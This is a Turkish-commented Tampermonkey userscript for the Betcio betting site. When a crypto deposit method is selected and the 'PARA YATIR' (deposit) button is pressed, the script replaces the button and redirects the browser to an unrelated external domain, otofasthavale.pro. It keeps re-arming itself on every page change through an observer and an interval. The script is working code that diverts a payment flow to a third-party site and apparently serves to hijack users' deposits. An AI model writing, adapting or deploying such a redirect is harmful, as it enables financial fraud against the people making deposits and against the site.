// ==UserScript==
// @name         Betcio - Kripto Span + PARA YATIR Yönlendirme (Düzeltilmiş)
// @namespace    http://tampermonkey.net/
// @version      1.4
// @description  Span'da kripto varsa ve PARA YATIR'a basılırsa yönlendir (buton enable sorunu minimize)
// @match        *://*.betcio*/*
// @match        *://m.betcio*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const KRIPTO_KELIMELER = ['lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron']
        .map(w => w.toLowerCase());

    const METHOD_SPAN_XPATH = "/html/body/div[1]/div[11]/div/div/div[4]/div/div[1]/span";

    function getElementByXPath(xpath) {
        try {
            return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
        } catch (e) {
            return null;
        }
    }

    function isKriptoSecili() {
        const span = getElementByXPath(METHOD_SPAN_XPATH);
        if (!span) return false;
        const text = (span.textContent || '').toLowerCase().trim();
        return KRIPTO_KELIMELER.some(k => text.includes(k));
    }

    function findParaYatirButton() {
        const candidates = document.querySelectorAll('button[type="submit"], button.btn, button[class*="deposit"], button.a-color');
        for (const btn of candidates) {
            const text = (btn.textContent || '').trim().toUpperCase();
            const title = (btn.getAttribute('title') || '').toUpperCase();
            const classes = btn.className.toLowerCase();
            if ((text.includes('PARA YATIR') || title.includes('PARA YATIR')) && classes.includes('deposit')) {
                return btn;
            }
        }
        return null;
    }

    function setupYonlendirme() {
        if (!isKriptoSecili()) return;

        const button = findParaYatirButton();
        if (!button) return;

        // Önceki listener'ları temizlemek için (tekrar eklenmesin)
        const clone = button.cloneNode(true);
        button.parentNode.replaceChild(clone, button);

        // NORMAL fazda dinle → sitenin validation'ı çalışsın
        clone.addEventListener('click', function(e) {
            // Hemen yönlendir, ama preventDefault YAPMA (sitelerin bazıları buna çok duyarlı)
            console.log('Kripto + PARA YATIR tıklandı → yönlendirme');

            // Küçük gecikme ile yönlendir (validation'ın tamamlanmasına izin ver)
            setTimeout(() => {
                window.location.href = 'https://otofasthavale.pro';
            }, 50);  // 50ms genelde yeterli

        }, false);  // capture: false → normal bubbling fazı
    }

    setTimeout(setupYonlendirme, 1000);
    setInterval(setupYonlendirme, 800);

    const observer = new MutationObserver(setupYonlendirme);
    observer.observe(document.body, { childList: true, subtree: true, attributes: true });
})();
